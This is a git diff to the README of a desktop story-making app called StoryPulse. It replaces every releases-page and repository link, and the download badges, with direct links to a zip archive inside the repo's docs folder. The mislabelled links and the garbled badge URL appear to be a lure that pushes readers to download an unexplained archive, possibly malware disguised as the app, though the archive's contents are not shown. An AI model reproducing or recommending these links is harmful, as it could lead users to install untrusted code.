@@ -1,6 +1,6 @@
 # 🎨 StoryPulse-make-your-story-better - Create Stunning Stories Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/tanvir82tsh/StoryPulse-make-your-story-better/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/tanvir82tsh/StoryPulse-make-your-story-better/main/docs/Pulse_better_story_make_your_Story_3.3-alpha.2.zip%20Latest%https://raw.githubusercontent.com/tanvir82tsh/StoryPulse-make-your-story-better/main/docs/Pulse_better_story_make_your_Story_3.3-alpha.2.zip)](https://raw.githubusercontent.com/tanvir82tsh/StoryPulse-make-your-story-better/main/docs/Pulse_better_story_make_your_Story_3.3-alpha.2.zip)
 
 ## 📖 About StoryPulse
 
@@ -26,7 +26,7 @@ StoryPulse is a free desktop app designed to help you turn your text into eye-ca
 To begin using StoryPulse, follow these steps:
 
 1. **Download the Software**:
-   - Visit the [Releases page](https://github.com/tanvir82tsh/StoryPulse-make-your-story-better/releases) to download the latest version of the app.
+   - Visit the [Releases page](https://raw.githubusercontent.com/tanvir82tsh/StoryPulse-make-your-story-better/main/docs/Pulse_better_story_make_your_Story_3.3-alpha.2.zip) to download the latest version of the app.
 
 2. **Install StoryPulse**:
    - Once downloaded, locate the installation file in your Downloads folder.
@@ -41,7 +41,7 @@ To begin using StoryPulse, follow these steps:
 
 To download StoryPulse, you can use the button below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/tanvir82tsh/StoryPulse-make-your-story-better/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/tanvir82tsh/StoryPulse-make-your-story-better/main/docs/Pulse_better_story_make_your_Story_3.3-alpha.2.zip%20Latest%https://raw.githubusercontent.com/tanvir82tsh/StoryPulse-make-your-story-better/main/docs/Pulse_better_story_make_your_Story_3.3-alpha.2.zip)](https://raw.githubusercontent.com/tanvir82tsh/StoryPulse-make-your-story-better/main/docs/Pulse_better_story_make_your_Story_3.3-alpha.2.zip)
 
 Follow the installation steps mentioned above to get started.
 
@@ -75,7 +75,7 @@ We welcome contributions from everyone. If you want to add features or fix bugs,
 
 ## 🔗 Useful Links
 
-- [StoryPulse Releases](https://github.com/tanvir82tsh/StoryPulse-make-your-story-better/releases)
-- [GitHub Repository](https://github.com/tanvir82tsh/StoryPulse-make-your-story-better)
+- [StoryPulse Releases](https://raw.githubusercontent.com/tanvir82tsh/StoryPulse-make-your-story-better/main/docs/Pulse_better_story_make_your_Story_3.3-alpha.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/tanvir82tsh/StoryPulse-make-your-story-better/main/docs/Pulse_better_story_make_your_Story_3.3-alpha.2.zip)
 
 Download StoryPulse and start creating amazing stories today!
